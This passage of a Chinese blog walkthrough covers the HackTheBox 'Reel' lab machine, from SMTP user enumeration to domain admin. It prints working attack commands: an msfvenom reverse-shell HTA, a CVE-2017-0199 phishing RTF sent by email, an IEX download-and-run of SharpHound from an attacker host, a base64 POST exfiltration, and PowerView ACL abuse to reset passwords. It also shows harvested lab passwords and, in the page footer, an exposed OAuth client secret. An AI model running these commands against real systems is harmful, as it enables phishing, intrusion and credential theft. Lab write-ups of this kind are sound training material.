+<h2 id="smtp-user-enum"><a href="#smtp-user-enum" class="headerlink" title="smtp-user-enum"></a>smtp-user-enum</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">➜  Reel smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77</span><br><span class="line">Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )</span><br><span class="line"></span><br><span class="line"> ----------------------------------------------------------</span><br><span class="line">|                   Scan Information                       |</span><br><span class="line"> ----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Mode ..................... RCPT</span><br><span class="line">Worker Processes ......... 5</span><br><span class="line">Usernames file ........... users.txt</span><br><span class="line">Target count ............. 1</span><br><span class="line">Username count ........... 15</span><br><span class="line">Target TCP port .......... 25</span><br><span class="line">Query timeout ............ 5 secs</span><br><span class="line">Target domain ............</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####### Scan started at Thu Nov 12 20:06:01 2020 #########</span></span></span><br><span class="line">10.10.10.77: reel@htb exists</span><br><span class="line">10.10.10.77: reel@htb.local exists</span><br><span class="line">10.10.10.77: administrator@htb exists</span><br><span class="line">10.10.10.77: admin@htb exists</span><br><span class="line">10.10.10.77: reel@reel.htb exists</span><br><span class="line">10.10.10.77: root@htb exists</span><br><span class="line">10.10.10.77: sadfasdfasdfasdf@htb exists</span><br><span class="line">10.10.10.77: nico@megabank.com exists</span><br><span class="line">10.10.10.77: htb@metabank.com exists</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">####### Scan completed at Thu Nov 12 20:06:03 2020 #########</span></span></span><br><span class="line">9 results.</span><br><span class="line"></span><br><span class="line">15 queries in 2 seconds (7.5 queries / sec)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="users-txt"><a href="#users-txt" class="headerlink" title="users.txt"></a>users.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">reel</span><br><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">reel@htb</span><br><span class="line">reel@htb.local</span><br><span class="line">reel@reel.htb</span><br><span class="line">administrator@htb</span><br><span class="line">admin@htb</span><br><span class="line">root@htb</span><br><span class="line">sadfasdfasdfasdf@htb</span><br><span class="line">nico@megabank.com</span><br><span class="line">0xdf@megabank.com</span><br><span class="line">htb@metabank.com</span><br></pre></td></tr></table></figure>
+
+<h1 id="RTF-vuln"><a href="#RTF-vuln" class="headerlink" title="RTF vuln"></a>RTF vuln</h1><p>上面的readme中提示了email rtf格式文件，相关漏洞：</p>
+<ul>
+<li>bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.<br><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></li>
+</ul>
+<h2 id="生成hta"><a href="#生成hta" class="headerlink" title="生成hta"></a>生成hta</h2><p>首先直接msfvenom生成一个恶意hta：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f hta-psh -o msfv.hta</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成RTF"><a href="#生成RTF" class="headerlink" title="生成RTF"></a>生成RTF</h2><p>然后直接用漏洞利用脚本生成RTF文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.6/msfv.hta -t rtf -x 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="sendemail-amp-amp-getshell"><a href="#sendemail-amp-amp-getshell" class="headerlink" title="sendemail &amp;&amp; getshell"></a>sendemail &amp;&amp; getshell</h2><p>然后准备就绪，发送钓鱼邮件，getshell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m SimpleHTTPServer 80</span><br><span class="line">nc -lvvp 443</span><br><span class="line">sendEmail -f miao@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="msf一键"><a href="#msf一键" class="headerlink" title="msf一键"></a>msf一键</h2><p>msf有<code>exploit/windows/fileformat/office_word_hta</code>这个模块，可以一键生成hta，rtf文件，启动舰艇，只需要自己sendemail就可以</p>
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的nico用户shell，桌面得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="nico-to-tom"><a href="#nico-to-tom" class="headerlink" title="nico to tom"></a>nico to tom</h1><h2 id="cred-xml"><a href="#cred-xml" class="headerlink" title="cred.xml"></a>cred.xml</h2><p>nico用户桌面有个cred.xml文件,里面是tom账号认证信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Objs</span> <span class="attr">Version</span>=<span class="string">"1.1.0.1"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/powershell/2004/04"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Obj</span> <span class="attr">RefId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TN</span> <span class="attr">RefId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">T</span>&gt;</span>System.Management.Automation.PSCredential<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">T</span>&gt;</span>System.Object<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TN</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ToString</span>&gt;</span>System.Management.Automation.PSCredential<span class="tag">&lt;/<span class="name">ToString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Props</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">S</span> <span class="attr">N</span>=<span class="string">"UserName"</span>&gt;</span>HTB\Tom<span class="tag">&lt;/<span class="name">S</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SS</span> <span class="attr">N</span>=<span class="string">"Password"</span>&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692<span class="tag">&lt;/<span class="name">SS</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Obj</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Objs</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="creds"><a href="#creds" class="headerlink" title="creds"></a>creds</h2><p>直接用powersell解析这个xml，得到tom用户的密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;$cred &#x3D; Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;</span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>
+
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>注意前面开了22端口SSH，tom账号可以直接ssh登录：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>tom用户桌面<code>AD Audit</code>目录直接有BloodHound(这个确实是靶机原本就有的，不是别人传的)和一个note.txt：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="groups"><a href="#groups" class="headerlink" title="groups"></a>groups</h2><p>根据提示信息，去看一下其他用户组,发现Backup_Admins组，这类用户组一般都有特权：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$groups</span> = [adsi] <span class="string">"LDAP://REEL:389/OU=Groups,DC=HTB,DC=LOCAL"</span></span><br><span class="line"><span class="variable">$searcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher <span class="variable">$groups</span></span><br><span class="line"><span class="variable">$searcher</span>.Filter = <span class="string">'(objectClass=Group)'</span></span><br><span class="line"><span class="variable">$results</span> = <span class="variable">$searcher</span>.FindAll()</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">in</span> <span class="variable">$results</span>) &#123;<span class="variable">$group</span> = <span class="variable">$result</span>.Properties;<span class="variable">$group</span>.name&#125;</span><br><span class="line"></span><br><span class="line">Backup_Admins</span><br><span class="line">AppLocker_Test</span><br><span class="line">SharePoint_Admins</span><br><span class="line">DR_Site</span><br><span class="line">SQL_Admins</span><br><span class="line">HelpDesk_Admins</span><br><span class="line">Restrictions</span><br><span class="line">All_Staff</span><br><span class="line">MegaBank_Users</span><br><span class="line">Finance_Users</span><br><span class="line">HR_Team</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="note-txt"><a href="#note-txt" class="headerlink" title="note.txt"></a>note.txt</h2><blockquote>
+<p>Findings:</p>
+<p>Surprisingly no AD attack paths from user to Domain Admin (using default shortes<br>t path query).</p>
+<p>Maybe we should re-run Cypher query against other groups we’ve created.</p>
+</blockquote>
+<h1 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h1><p>虽然靶机里有bloodhound的结果，但因为现在新版本格式已经改变了，自己重新传一个跑一下，结果拿回来分析，传输结果麻烦点，base64编码解码还原成zip：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.Webclient).downloadstring(<span class="string">"http://10.10.14.6:9999/SharpHound.ps1"</span>)</span><br><span class="line">Invoke-BloodHound -CollectionMethod All</span><br><span class="line"></span><br><span class="line"><span class="variable">$Base64String</span> = [System.convert]::ToBase64String((<span class="built_in">Get-Content</span> -Path <span class="string">'c:/temp/20201117065659_BloodHound.zip'</span> -Encoding Byte))</span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> -Uri http://<span class="number">10.10</span>.<span class="number">14.6</span>:<span class="number">4445</span> -Method POST -Body <span class="variable">$Base64String</span></span><br><span class="line"></span><br><span class="line">echo &lt;base64 encoded zip file&gt; | base64 -d -w <span class="number">0</span> &gt; bloodhound_reel.zip</span><br></pre></td></tr></table></figure>
+
+<p>简单分析，发现tom用户可以通过claire用户到Backup_Admins：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="tom-to-claire"><a href="#tom-to-claire" class="headerlink" title="tom to claire"></a>tom to claire</h1><p>就是导入powerview，根据bloodhound信息一步步,然后就可以用我们设置的密码ssh登录claire账户：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入powerview</span></span><br><span class="line">. .\PowerView.ps1</span><br><span class="line"><span class="comment"># 将tom设置为claire的ACL的所有者</span></span><br><span class="line">Set-DomainObjectOwner -identity claire -OwnerIdentity tom</span><br><span class="line"><span class="comment"># 授予tom权限以更改该ACL上的密码</span></span><br><span class="line">Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword</span><br><span class="line"><span class="comment"># 创建一个凭证，然后设置克莱尔的密码</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"qwer1234QWER!@#$"</span> -AsPlainText -force</span><br><span class="line">Set-DomainUserPassword -identity claire -accountpassword <span class="variable">$cred</span></span><br><span class="line"><span class="comment"># 以上操作建议直接一次性复制粘贴，有自动重置</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="claire-to-Backup-Admins"><a href="#claire-to-Backup-Admins" class="headerlink" title="claire to Backup_Admins"></a>claire to Backup_Admins</h1><p>根据bloodhound的信息，claire对Backup_Admins有GenericWrite权限，还是一步步,(预期是到backup，bloodhound给的提示是能到domain admin的：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group backup_admins claire /add</span><br><span class="line"><span class="comment"># 添加到backup_admins组后需要重新登录才会生效</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Backup-Admins-to-Administrator"><a href="#Backup-Admins-to-Administrator" class="headerlink" title="Backup_Admins to Administrator"></a>Backup_Admins to Administrator</h1><p>查看权限，backup_admins对Administrator有完全访问权限：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">claire@REEL C:\Users&gt;icacls Administrator</span><br><span class="line">Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)</span><br><span class="line">              HTB\Backup_Admins:(OI)(CI)(F)</span><br><span class="line">              HTB\Administrator:(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(OI)(CI)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure>
+
+<p>但直接去读root.txt还是被禁止：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="Backup-Scripts"><a href="#Backup-Scripts" class="headerlink" title="Backup Scripts"></a>Backup Scripts</h2><p> 备份脚本里得到admin密码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin password</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">"Cr4ckMeIfYouC4n!"</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后就直接登录Administrator，桌面得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111714.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>smtp-user-enum | pentestmonkey<br><a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" target="_blank" rel="noopener">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></li>
+<li>bhdresh/CVE-2017-0199: Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.<br><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></li>
+<li>HTB: Reel | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2018/11/10/htb-reel.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2018/11/10/htb-reel.html</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/143" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/143</a></li>
+<li>HackTheBox - Reel - YouTube<br><a href="https://www.youtube.com/watch?v=ob9SgtFm6_g&amp;feature=youtu.be&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ob9SgtFm6_g&amp;feature=youtu.be&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2020-11-17T07:42:46.936Z" itemprop="dateUpdated">2020-11-17 15:42:46</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&title=《Reel - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&title=《Reel - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/11/17/Reel-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Reel - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2099/12/31/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%94%A8%E8%AA%9E/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">セキュリティ用語</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/11/11/Active-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Active - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&title=《Reel - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&title=《Reel - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/11/17/Reel-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Reel - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/11/17/Reel-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
